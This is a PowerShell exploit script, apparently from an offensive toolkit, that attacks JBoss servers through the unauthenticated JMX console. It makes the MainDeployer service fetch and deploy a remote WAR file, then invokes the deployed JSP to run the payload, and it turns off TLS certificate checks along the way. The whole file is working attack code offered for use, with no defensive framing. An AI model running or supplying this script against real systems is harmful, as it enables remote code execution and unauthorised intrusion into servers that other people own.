function Exploit-JMXConsole
{
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True)]
        [String]
        $Rhost,
        
        [Parameter(Mandatory=$True)]
        [Int]
        $Port,
        
        [String]
        $SSL,
        
        [Parameter(Mandatory=$True)]
        [String]
        $AppName,
        
        [Parameter(Mandatory=$True)]
        [String]
        $WARFile
    )

    try
    {
        $URL = "http$($SSL)://" + $($Rhost) + ':' + $($Port) + "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=" + $($WARFile)
        $URI = New-Object -TypeName System.Uri -ArgumentList $URL
        $WebRequest = [System.Net.WebRequest]::Create($URI)
        $WebRequest.Method = "HEAD"
        $Response = $WebRequest.GetResponse()
        $Response.Close()
    }
    catch
    {
        $ErrorMessage = $_.Exception.ErrorMessag
        Write-Output "[*] Error, transfer failed"
        break
        
    }


    Start-Sleep -s 20
    
    

    try
    {
        $URL = "http$($SSL)://" + $($Rhost) + ':' + $($Port) + '/' + $($AppName) + '/' + $($AppName) + '.jsp?'
        Write-Output "[*] Invoking your file at " + $URL
        $URI = New-Object -TypeName System.Uri -ArgumentList $URL
        $WebRequest = [System.Net.WebRequest]::Create($URI)
        $WebRequest.Method = "GET"
        $Response = $WebRequest.GetResponse()
        $Response.Close()
        Write-Output "[*] You're file has been deployed."    
    }
    catch
    {
        $ErrorMessage = $_.Exception.ErrorMessag
        Write-Output "[*] Error, transfer failed"
        break
        
    }
}

function Exploit-JBoss
{
    
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True)]
        [String]
        $Rhost,
        
        [Parameter(Mandatory=$True)]
        [Int]
        $Port,
        
        [Switch]
        $UseSSL,
        
        [Parameter(Mandatory=$True)]
        [Switch]
        $JMXConsole,
        
        [Parameter(Mandatory=$True)]
        [String]
        $AppName,
        
        [Parameter(Mandatory=$True)]
        [String]
        $WARFile
    )

    begin
    {
        if ($UseSSL)
        {
           
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            $SSL = 's'
        } else {
            $SSL = ''
        }
        
    }
    
    process
    {
       if ($JMXConsole)
        {
            Exploit-JMXConsole -Rhost $Rhost -SSL $SSL -Port $Port -AppName $AppName -WARFile $WARFile
        } 
    }
    
    end
    {
        Write-Output "Complete. Your payload has been delivered"
    }
    
}